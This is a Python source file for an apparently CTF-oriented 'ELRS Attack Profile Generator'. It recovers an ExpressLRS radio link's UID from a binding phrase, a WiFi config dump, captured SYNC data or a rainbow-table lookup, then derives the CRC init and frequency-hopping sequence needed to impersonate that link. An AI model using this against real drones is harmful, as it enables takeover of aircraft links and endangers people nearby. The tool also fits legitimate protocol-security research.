#!/usr/bin/env python3
"""
ELRS Attack Profile Generator — offline, source-derived parameters

Derives offline parameters from a supplied UID, phrase, or structured file.
It does not decode raw IQ or validate the live E8-TinyHawk link.

Input sources (pick one):
  --phrase TEXT       Binding phrase (derive UID via MD5)
  --uid HEX          Manual 6-byte UID in hex (e.g. aa:bb:cc:dd:ee:ff)
  --wifi-json FILE   WiFi config JSON from elrs-wifi-extract.py
  --sync-json FILE   Externally decoded SYNC JSON (not independently verified)
  --iq-file FILE     Reserved; fails closed until a validated IQ byte decoder exists
  --rainbow-match U4:U5  UID[4]:UID[5] hex pair to look up in rainbow table

Output:
  A JSON profile containing source-derived UID, CRC init, FHSS seed, hopping
  sequence, sync channel, sync word, and rate parameters. Output includes
  private UID material; keep saved profiles under ignored work/.

Validation:
  The profile includes only a synthetic self-check: a SYNC packet is built
  from the derived parameters and its CRC is verified round-trip. It does
  not validate any real captured bytes or receiver acceptance.

Usage:
    # From binding phrase (known phrase attack)
    elrs-attack-profile.py --phrase "iloveflying" -o work/profile.json

    # Dry-run with test phrase
    elrs-attack-profile.py --dry-run

    # From WiFi config extract
    elrs-attack-profile.py --wifi-json extracted_config.json -o work/profile.json

    # From SYNC capture output
    elrs-attack-profile.py --sync-json sync_results.json -o work/profile.json

    # From manual UID (e.g. from SYNC packet observation + rainbow lookup)
    elrs-attack-profile.py --uid aa:bb:cc:dd:ee:ff -o work/profile.json

    # From UID[4:5] via rainbow table lookup
    elrs-attack-profile.py --rainbow-match 3a:e2 \\
        --rainbow tools/elrs-rainbow-table.json -o work/profile.json

    # Raw IQ cannot produce a profile until packet-byte decoding is validated

    # Pretty-print profile to stdout
    elrs-attack-profile.py --phrase "iloveflying" --pretty

    # Show what commands to run with the profile
    elrs-attack-profile.py --phrase "iloveflying" --show-commands

For CTF research and authorized security testing only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
# Ensure tools/ is on sys.path for elrs_core imports
# ---------------------------------------------------------------------------
_TOOLS_DIR = Path(__file__).resolve().parent
if str(_TOOLS_DIR) not in sys.path:
    sys.path.insert(0, str(_TOOLS_DIR))

from elrs_core.crc import Crc2Byte, ELRS_CRC14_POLY, ELRS_CRC16_POLY
from elrs_core.fhss import (
    DOMAINS,
    DEFAULT_2G4_DOMAIN,
    build_sequence,
    sync_channel_candidates,
)
from elrs_core.ota import (
    OTA_VERSION_ID,
    PACKET_TYPE_SYNC,
    build_sync,
    validate_crc,
    ota_uid_crc_init,
)
from elrs_core.v3_compat import (
    v3_uid_crc_init,
    v3_uid_seed,
    v3_sync_channel,
    v3_build_sequence,
    v3_build_sync,
    v3_validate_crc,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PROFILE_VERSION = 2
ISM2G4_FREQ_COUNT = 80

V4_RATE_INTERVAL_US = {
    0: 2000,    # 500 Hz
    1: 4000,    # 250 Hz
    2: 5000,    # 200 Hz
    3: 6667,    # 150 Hz
    4: 10000,   # 100 Hz
    5: 20000,   # 50 Hz
    6: 40000,   # 25 Hz
}

V4_RATE_NAMES = {
    0: "500Hz", 1: "250Hz", 2: "200Hz", 3: "150Hz",
    4: "100Hz", 5: "50Hz", 6: "25Hz",
}

# Betaflight 4.4.2 src/main/rx/expresslrs_common.c, USE_RX_SX1280 row.
# These are rate indexes, not the newer standalone ELRS 4.x enum values.
V3_RATE_CONFIG = {
    0: ("500Hz", 2000),
    1: ("250Hz", 4000),
    2: ("150Hz", 6666),
    3: ("50Hz", 20000),
}


def log(msg: str) -> None:
    print(f"[profile] {msg}", file=sys.stderr)


# ---------------------------------------------------------------------------
# UID extraction from various sources
# ---------------------------------------------------------------------------

def phrase_to_uid(phrase: str) -> bytes:
    raw = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(raw.encode()).digest()[:6]


def parse_uid_hex(uid_str: str) -> bytes:
    """Parse UID from hex string (aa:bb:cc:dd:ee:ff or aabbccddeeff)."""
    clean = uid_str.replace(":", "").replace(" ", "").replace("0x", "")
    if len(clean) != 12:
        raise ValueError(f"UID must be 6 bytes (12 hex chars), got {len(clean)}: {uid_str}")
    return bytes.fromhex(clean)


def uid_from_wifi_json(path: str) -> tuple[bytes, dict]:
    """Extract UID from elrs-wifi-extract.py output JSON."""
    with open(path) as f:
        data = json.load(f)

    uid_info = data.get("uid", {})
    status = uid_info.get("status")

    if status == "extracted":
        uid_hex = uid_info.get("hex", "")
        if uid_hex and len(uid_hex) == 12:
            return bytes.fromhex(uid_hex), data
        uid_bytes = uid_info.get("bytes", [])
        if len(uid_bytes) == 6:
            return bytes(uid_bytes), data
        raise ValueError(f"WiFi JSON has 'extracted' status but no valid UID data")

    if status == "not_set":
        raise ValueError("WiFi JSON reports UID is all zeros (no binding phrase set)")
    if status == "not_found":
        raise ValueError("WiFi JSON reports UID was not present in /config response")

    raise ValueError(f"WiFi JSON UID status unrecognized: {status}")


def uid_from_sync_json(path: str) -> tuple[bytes, dict]:
    """Extract UID from elrs-sync-capture.py output JSON."""
    with open(path) as f:
        data = json.load(f)

    # sync capture may output a single result or an array
    results = data if isinstance(data, list) else [data]

    for result in results:
        # Check for rainbow match (full UID recovered)
        matches = result.get("rainbow_matches", [])
        if matches:
            best = matches[0]
            uid_hex = best.get("uid_hex", "")
            if uid_hex and len(uid_hex.replace(":", "")) == 12:
                return bytes.fromhex(uid_hex.replace(":", "")), result
            uid_bytes = best.get("uid", [])
            if len(uid_bytes) == 6:
                return bytes(uid_bytes), result

        # Check for direct UID field
        uid_hex = result.get("uid_hex", "")
        if uid_hex and len(uid_hex.replace(":", "")) == 12:
            return bytes.fromhex(uid_hex.replace(":", "")), result

        uid = result.get("uid", [])
        if isinstance(uid, list) and len(uid) == 6:
            return bytes(uid), result

    raise ValueError(
        "SYNC capture JSON contains no full UID. "
        "Only partial UID[4:5] was recovered — use --rainbow-match with a rainbow table "
        "to attempt full UID recovery, or capture more SYNC packets."
    )


def uid_from_rainbow_lookup(uid4: int, uid5: int, rainbow_path: str) -> bytes:
    """Look up UID[4]:UID[5] in the rainbow table to recover the full UID."""
    with open(rainbow_path) as f:
        table = json.load(f)

    # The rainbow table maps phrases to UIDs; search for matching uid4/uid5
    entries = table if isinstance(table, list) else table.get("entries", [])
    matches = []
    for entry in entries:
        uid_bytes = entry.get("uid_bytes") or entry.get("uid", [])
        if len(uid_bytes) >= 6 and uid_bytes[4] == uid4 and uid_bytes[5] == uid5:
            matches.append(entry)

    if not matches:
        raise ValueError(
            f"No rainbow table match for UID[4:5] = {uid4:02x}:{uid5:02x}. "
            f"Searched {len(entries)} entries. The binding phrase may not be in the table."
        )

    if len(matches) > 1:
        log(f"WARNING: {len(matches)} rainbow table collisions for "
            f"UID[4:5]={uid4:02x}:{uid5:02x}")
        for m in matches:
            log(f"  phrase={m.get('phrase', '?')!r}  uid={m.get('uid_hex', '?')}")
        log("Using first match — verify with CRC validation against a captured packet.")

    best = matches[0]
    uid_hex = best.get("uid_hex", "")
    if uid_hex:
        return bytes.fromhex(uid_hex.replace(":", ""))
    return bytes(best["uid"])


# ---------------------------------------------------------------------------
# Seed and CRC derivation
# ---------------------------------------------------------------------------

def uid_to_fhss_seed(uid: bytes, ota_version: int) -> int:
    return ((uid[2] << 24) | (uid[3] << 16) |
            (uid[4] << 8) | (uid[5] ^ ota_version))


def uid_to_crc_init(uid: bytes, ota_version: int) -> int:
    init = (uid[4] << 8) | uid[5]
    return init ^ (ota_version if ota_version == 3 else ota_version << 8)


def sync_channel_for_version(ota_version: int,
                             freq_count: int = ISM2G4_FREQ_COUNT) -> int:
    if ota_version not in (3, 4):
        raise ValueError(f"unsupported OTA version: {ota_version}")
    return freq_count // 2 + (1 if ota_version == 3 else 0)


# ---------------------------------------------------------------------------
# Profile builder
# ---------------------------------------------------------------------------

def build_profile(uid: bytes, ota_version: int = 3,
                  domain_name: str = DEFAULT_2G4_DOMAIN,
                  rate_enum: int = 2,
                  source_info: dict | None = None) -> dict:
    """Build source-derived parameters from a UID, not RF validation."""
    if len(uid) != 6:
        raise ValueError(f"UID must be 6 bytes, got {len(uid)}")
    if ota_version == 3:
        if rate_enum not in V3_RATE_CONFIG:
            raise ValueError("Betaflight 4.4.2 SX1280 rate index must be 0..3")
        rate_name, interval_us = V3_RATE_CONFIG[rate_enum]
    elif ota_version == 4:
        if rate_enum not in V4_RATE_NAMES:
            raise ValueError("ELRS 4.x rate enum must be 0..6")
        rate_name, interval_us = V4_RATE_NAMES[rate_enum], V4_RATE_INTERVAL_US[rate_enum]
    else:
        raise ValueError(f"unsupported OTA version: {ota_version}")

    domain = DOMAINS[domain_name]
    freq_count = domain.freq_count

    if ota_version == 3:
        sync_channel = v3_sync_channel(freq_count)
        fhss_seed = v3_uid_seed(uid)
        crc_init = v3_uid_crc_init(uid)
        fhss_seq = v3_build_sequence(uid, freq_count)
    else:
        sync_channel = sync_channel_for_version(ota_version, freq_count)
        fhss_seed = uid_to_fhss_seed(uid, ota_version)
        crc_init = uid_to_crc_init(uid, ota_version)
        fhss_seq = build_sequence(fhss_seed, freq_count, sync_channel)

    # Channel frequencies in Hz
    hop_freqs_hz = [domain.channel_freq(ch) for ch in fhss_seq]

    # Sync word (the UID[4:5] bytes visible in every SYNC packet)
    sync_word = (uid[4] << 8) | uid[5]

    # Build validation SYNC packet and verify CRC round-trip
    validation = _validate_profile(uid, ota_version, crc_init, fhss_seq,
                                   sync_channel, rate_enum,
                                   is_full=False)

    profile = {
        "profile_version": PROFILE_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "generator": "elrs-attack-profile.py",

        "uid": {
            "hex": uid.hex(),
            "bytes": list(uid),
            "uid4": uid[4],
            "uid5": uid[5],
            "sync_visible_hex": f"{uid[4]:02x}:{uid[5]:02x}",
        },

        "ota_version": ota_version,
        "ota_version_note": f"ELRS {'3.x (Betaflight 4.4.2)' if ota_version == 3 else '4.x'}",

        "crc": {
            "init": crc_init,
            "init_hex": f"0x{crc_init:04X}",
            "poly_14bit": ELRS_CRC14_POLY,
            "poly_14bit_hex": f"0x{ELRS_CRC14_POLY:04X}",
            "poly_16bit": ELRS_CRC16_POLY,
            "poly_16bit_hex": f"0x{ELRS_CRC16_POLY:04X}",
        },

        "fhss": {
            "seed": fhss_seed,
            "seed_hex": f"0x{fhss_seed:08X}",
            "domain": domain_name,
            "freq_count": freq_count,
            "freq_start_hz": domain.freq_start,
            "freq_stop_hz": domain.freq_stop,
            "sync_channel": sync_channel,
            "sync_channel_freq_hz": domain.channel_freq(sync_channel),
            "sync_channel_freq_mhz": round(domain.channel_freq(sync_channel) / 1e6, 1),
            "sequence_length": len(fhss_seq),
            "sequence": fhss_seq,
            "hop_frequencies_hz": hop_freqs_hz,
        },

        "sync_word": {
            "value": sync_word,
            "hex": f"0x{sync_word:04X}",
        },

        "rate": {
            "enum": rate_enum,
            "name": rate_name,
            "interval_us": interval_us,
            "index_semantics": "Betaflight 4.4.2 SX1280 index" if ota_version == 3 else "ELRS 4.x enum",
        },

        "tool_handoff": {
            "status": "blocked",
            "reason": "Real packet bytes, PHY, and version-specific forger/TX behavior are not validated",
        },

        "validation": validation,
    }

    if source_info:
        profile["source"] = source_info

    return profile


def _validate_profile(uid: bytes, ota_version: int, crc_init: int,
                      fhss_seq: list[int], sync_channel: int,
                      rate_enum: int, is_full: bool) -> dict:
    """Build a synthetic SYNC packet and verify CRC round-trip."""
    try:
        # The SYNC field is a position in the sequence, not its channel value.
        fhss_index = 0

        if ota_version == 3:
            sync_pkt = v3_build_sync(
                uid=uid,
                fhss_index=fhss_index,
                nonce=0,
                rate_index=rate_enum,
            )
            crc_ok = v3_validate_crc(sync_pkt, uid)
        else:
            sync_pkt = build_sync(
                is_full=is_full,
                fhss_index=fhss_index,
                nonce=0,
                rf_rate_enum=rate_enum,
                uid4=uid[4],
                uid5=uid[5],
                crc_init=crc_init,
                ota_nonce=0,
            )
            crc_ok = validate_crc(
                sync_pkt, is_full, crc_init,
                ota_nonce=0, packet_type=PACKET_TYPE_SYNC,
            )

        # Verify FHSS sequence starts with sync channel
        seq_starts_sync = (len(fhss_seq) > 0 and fhss_seq[0] == sync_channel)

        return {
            "status": "synthetic_only" if (crc_ok and seq_starts_sync) else "FAILED",
            "real_capture_validated": False,
            "crc_round_trip": crc_ok,
            "fhss_starts_with_sync": seq_starts_sync,
            "test_sync_packet_hex": sync_pkt.hex(),
            "test_packet_size": len(sync_pkt),
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "error": str(e),
        }


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def print_summary(profile: dict) -> None:
    """Print human-readable summary to stderr."""
    uid = profile["uid"]
    crc = profile["crc"]
    fhss = profile["fhss"]
    val = profile["validation"]
    rate = profile["rate"]

    print(f"\n{'='*60}", file=sys.stderr)
    print("ELRS Attack Profile", file=sys.stderr)
    print(f"{'='*60}", file=sys.stderr)
    print(f"  UID:            {uid['hex']}", file=sys.stderr)
    print(f"  UID visible:    {uid['sync_visible_hex']} (in every SYNC)", file=sys.stderr)
    print(f"  OTA version:    {profile['ota_version']} ({profile['ota_version_note']})", file=sys.stderr)
    print(f"  CRC init:       {crc['init_hex']}", file=sys.stderr)
    print(f"  FHSS seed:      {fhss['seed_hex']}", file=sys.stderr)
    print(f"  Domain:         {fhss['domain']} ({fhss['freq_count']} channels)", file=sys.stderr)
    print(f"  Sync channel:   {fhss['sync_channel']} ({fhss['sync_channel_freq_mhz']} MHz)", file=sys.stderr)
    print(f"  Sequence len:   {fhss['sequence_length']}", file=sys.stderr)
    print(f"  Rate:           {rate['name']} ({rate['interval_us']} us)", file=sys.stderr)
    print(f"  Self-check:     {val['status']} (no real packet bytes validated)", file=sys.stderr)
    if val.get("test_sync_packet_hex"):
        print(f"  Test SYNC pkt:  {val['test_sync_packet_hex']}", file=sys.stderr)
    print(f"\n  First 20 hops:  {fhss['sequence'][:20]}", file=sys.stderr)
    freqs_mhz = [round(f / 1e6, 1) for f in fhss["hop_frequencies_hz"][:10]]
    print(f"  First 10 freqs: {freqs_mhz} MHz", file=sys.stderr)

    src = profile.get("source", {})
    if src:
        print(f"\n  Source:         {src.get('type', 'unknown')}", file=sys.stderr)
        if src.get("phrase"):
            print(f"  Phrase:         {src['phrase']!r}", file=sys.stderr)
        if src.get("file"):
            print(f"  File:           {src['file']}", file=sys.stderr)

    print(f"{'='*60}\n", file=sys.stderr)


def print_commands(profile: dict) -> None:
    """Print only the offline verification step appropriate to this evidence."""
    print("\n--- Offline verification only ---", file=sys.stderr)
    print("  Profile self-check is synthetic; it does not validate captured bytes.", file=sys.stderr)
    print("  Keep private frames and UID under ignored work/.", file=sys.stderr)
    if profile["ota_version"] == 3:
        print("  python3 tools/elrs-v3-frame-check.py --input work/candidates.jsonl "
              "--uid-file work/private-uid.hex --json", file=sys.stderr)
    print("  RF transmission remains disabled by the project safety gate.\n", file=sys.stderr)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="ELRS Attack Profile Generator — capture-to-attack-parameters processor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )

    # Input sources (mutually exclusive)
    src = parser.add_argument_group("input source (pick one)")
    src_excl = src.add_mutually_exclusive_group()
    src_excl.add_argument("--phrase", metavar="TEXT",
                          help="ELRS binding phrase (derive UID via MD5)")
    src_excl.add_argument("--uid", metavar="HEX",
                          help="Manual 6-byte UID hex (aa:bb:cc:dd:ee:ff or aabbccddeeff)")
    src_excl.add_argument("--wifi-json", metavar="FILE",
                          help="WiFi config JSON from elrs-wifi-extract.py")
    src_excl.add_argument("--sync-json", metavar="FILE",
                          help="SYNC capture JSON from elrs-sync-capture.py")
    src_excl.add_argument("--iq-file", metavar="FILE",
                          help="Unavailable: no validated IQ-to-packet-byte decoder yet")
    src_excl.add_argument("--rainbow-match", metavar="U4:U5",
                          help="UID[4]:UID[5] hex pair for rainbow table lookup")
    src_excl.add_argument("--dry-run", action="store_true",
                          help='Generate profile using test phrase "default"')

    # Rainbow table
    parser.add_argument("--rainbow", metavar="FILE",
                        help="Rainbow table JSON (for --rainbow-match)")

    # Protocol options
    proto = parser.add_argument_group("protocol options")
    proto.add_argument("--ota-version", type=int, default=3, choices=[3, 4],
                       help="OTA version: 3=ELRS 3.x/BF4.4.2, 4=ELRS 4.x (default: 3)")
    proto.add_argument("--domain", default=DEFAULT_2G4_DOMAIN,
                       choices=list(DOMAINS.keys()),
                       help=f"Regulatory domain (default: {DEFAULT_2G4_DOMAIN})")
    proto.add_argument("--rate", type=int, default=2, choices=range(7),
                       help="Rate index/enum; BF4.4.2 SX1280: 0=500, 1=250, 2=150, 3=50Hz (default: 2)")

    # Output options
    out = parser.add_argument_group("output options")
    out.add_argument("-o", "--output", metavar="FILE",
                     help="Write profile JSON to file (default: stdout)")
    out.add_argument("--pretty", action="store_true",
                     help="Pretty-print JSON output")
    out.add_argument("--show-commands", action="store_true",
                     help="Print example tool commands to stderr")
    out.add_argument("--quiet", action="store_true",
                     help="Suppress summary output on stderr")

    args = parser.parse_args()

    # Resolve input source → UID
    uid: bytes | None = None
    source_info: dict = {}

    try:
        if args.dry_run:
            phrase = "default"
            uid = phrase_to_uid(phrase)
            source_info = {"type": "dry_run", "phrase": phrase}
            log(f"Dry-run mode: using test phrase {phrase!r}")

        elif args.phrase:
            uid = phrase_to_uid(args.phrase)
            source_info = {"type": "binding_phrase", "phrase": args.phrase}
            log(f"Derived UID from phrase: {uid.hex()}")

        elif args.uid:
            uid = parse_uid_hex(args.uid)
            source_info = {"type": "manual_uid", "uid_input": args.uid}
            log(f"Using manual UID: {uid.hex()}")

        elif args.wifi_json:
            uid, wifi_data = uid_from_wifi_json(args.wifi_json)
            source_info = {
                "type": "wifi_config",
                "file": args.wifi_json,
                "device": wifi_data.get("device", {}),
            }
            log(f"Extracted UID from WiFi config: {uid.hex()}")

        elif args.sync_json:
            uid, sync_data = uid_from_sync_json(args.sync_json)
            source_info = {"type": "sync_capture", "file": args.sync_json}
            log(f"Extracted UID from SYNC capture: {uid.hex()}")

        elif args.iq_file:
            raise ValueError(
                "IQ-to-packet-byte decoding is not validated for SX1280 long "
                "interleaving; no profile can be derived from raw IQ yet. "
                "Use independently decoded, CRC-checked bytes offline."
            )

        elif args.rainbow_match:
            parts = args.rainbow_match.split(":")
            if len(parts) != 2:
                parser.error("--rainbow-match must be U4:U5 hex pair (e.g. 3a:e2)")
            uid4 = int(parts[0], 16)
            uid5 = int(parts[1], 16)
            rainbow_path = args.rainbow
            if not rainbow_path:
                # Try default locations
                for candidate in [
                    _TOOLS_DIR / "elrs-rainbow-table.json",
                    _TOOLS_DIR.parent / "tools" / "elrs-rainbow-table.json",
                ]:
                    if candidate.exists():
                        rainbow_path = str(candidate)
                        break
            if not rainbow_path:
                parser.error("--rainbow-match requires --rainbow <table.json>")
            uid = uid_from_rainbow_lookup(uid4, uid5, rainbow_path)
            source_info = {
                "type": "rainbow_lookup",
                "uid4_uid5": args.rainbow_match,
                "rainbow_table": rainbow_path,
            }
            log(f"Rainbow table match: {uid.hex()}")

        else:
            parser.error(
                "No input source specified. Use --phrase, --uid, --wifi-json, "
                "--sync-json, --iq-file, --rainbow-match, or --dry-run."
            )

    except (ValueError, FileNotFoundError, RuntimeError) as e:
        print(f"ERROR: {e}", file=sys.stderr)
        return 1

    # Build the profile
    try:
        profile = build_profile(
            uid=uid,
            ota_version=args.ota_version,
            domain_name=args.domain,
            rate_enum=args.rate,
            source_info=source_info,
        )
    except ValueError as e:
        print(f"ERROR: {e}", file=sys.stderr)
        return 1

    # Validate
    if profile["validation"]["status"] != "synthetic_only":
        log(f"WARNING: Profile validation FAILED: {profile['validation']}")

    # Output
    if not args.quiet:
        print_summary(profile)

    if args.show_commands:
        print_commands(profile)

    indent = 2 if args.pretty else None
    json_str = json.dumps(profile, indent=indent)

    if args.output:
        with open(args.output, "w") as f:
            f.write(json_str)
            f.write("\n")
        log(f"Profile written to {args.output}")
    else:
        print(json_str)

    return 0


if __name__ == "__main__":
    sys.exit(main())
